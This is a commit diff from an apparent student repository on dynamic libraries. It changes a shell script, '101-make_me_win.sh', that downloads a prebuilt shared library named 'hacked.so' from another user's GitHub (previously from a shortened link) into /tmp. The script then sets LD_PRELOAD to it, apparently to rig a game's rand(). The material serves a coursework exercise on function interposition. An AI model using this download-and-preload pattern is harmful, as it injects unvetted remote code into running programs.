1458ae4008fd3f812ceca0c8cf13927e679d5596
Abubakar Adam Sani <Athernee@gmail.com>
2023-06-20 08:20:41 +0000

    101-make_me_win.sh

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -O /tmp/libmega_mil.so https://t.ly/_Yi-
-export LD_PRELOAD=/tmp/libmega_mil.so
+wget -P /tmp https://github.com/NwabuezeFranklin/alx-low_level_programming/raw/main/0x18-dynamic_libraries/hacked.so
+export LD_PRELOAD=/tmp/hacked.so
--- 0x18-dynamic_libraries/main.h
+++ 0x18-dynamic_libraries/main.h
@@ -3,7 +3,6 @@
 
 #include <stdio.h>
 #include <stddef.h>
-int rand(void);
 int _putchar(char c);
 int _islower(int c);
 int _isalpha(int c);
